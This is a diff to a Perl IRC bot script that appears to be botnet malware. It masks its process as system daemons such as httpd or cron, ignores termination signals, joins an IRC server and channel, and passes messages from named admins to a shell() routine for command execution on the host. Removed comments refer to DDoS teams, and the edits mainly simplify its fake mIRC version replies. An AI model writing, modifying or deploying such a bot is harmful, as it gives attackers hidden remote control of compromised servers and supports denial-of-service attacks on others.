@@ -50,31 +50,13 @@ my @rps = ("/usr/local/apache/bin/httpd",
            "/usr/sbin/cron");
 
 my $process = $rps[rand scalar @rps];
-my @rversion = ("\001VERSION - unknown command.\001",
-				"\001mIRC v5.91 K.Mardam-Bey\001",
-				"\001mIRC v6.2 Khaled Mardam-Bey\001",
-				"\001mIRC v6.03 Khaled Mardam-Bey\001",
-				"\001mIRC v6.14 Khaled Mardam-Bey\001",
-				"\001mIRC v6.15 Khaled Mardam-Bey\001",
-				"\001mIRC v6.16 Khaled Mardam-Bey\001",
-				"\001mIRC v6.17 Khaled Mardam-Bey\001",
-				"\001mIRC v6.21 Khaled Mardam-Bey\001",
-				"\001mIRC v6.31 Khaled Mardam-Bey\001",
-				"\001mIRC v7.15 Khaled Mardam-Bey\001");
+my @rversion = ("\001mIRC\001");
 my $vers = $rversion[rand scalar @rversion];
 my @rircname = ("Bot[A]","Bot[I]");
 my $ircname = $rircname[rand scalar @rircname];
 
-## my @rrealname = ("4,1[ #ZSquad Corp ]",
-## 				    "4,1 /!\ DDoS Live For Brother Team /!\ ",
-##				    "12,1<///8,1///4,1###>",
-##                  "2,1---=== 4,1 DDoS Live For Brother Team 2,1===---");
-## chop (my $realname = $rrealname[rand scalar @rrealname]);
-
 chop (my $realname = $rircname[rand scalar @rircname]);
 
-## my @nickname = ("DDoS[U]");
-## my $nick =$nickname[rand scalar @nickname];
 
 my $nick =$rircname[rand scalar @rircname];
 my $server = 'irc.smurfnet.ch';
@@ -83,16 +65,9 @@ my $linas_max='8';
 my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'v.02';
-#on @admins put your bot admin name like for example "ZPoob" but make sure to use this symbol "," and then do put the double-colums like of ur name like this "jakecobz" u can remove this message if u want
 my @admins = ("Leaxi");
-#my @hostauth = ("irc.2600.net");
 my @channels = ("#L11");
 my $pacotes = 1;
-
-#################################################################
-##### [ Stop Editing if you dont know what are you doing. ] #####
-#################################################################
- 
 $SIG{'INT'} = 'IGNORE';
 $SIG{'HUP'} = 'IGNORE';
 $SIG{'TERM'} = 'IGNORE';
@@ -269,7 +244,6 @@ sub parse {
     if ($args =~ /^\001VERSION\001$/) {
          notice("$pn", "".$vers."");
     }
-    #if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
     if (grep {$_ =~ /^\Q$pn\E$/i } @admins ) {
     if ($onde eq "$meunick"){
     shell("$pn", "$args");
@@ -865,7 +839,3 @@ sub away {
 sub back { away(); }
  
 }
- 
-###################
-##### [ EOF ] #####
-###################
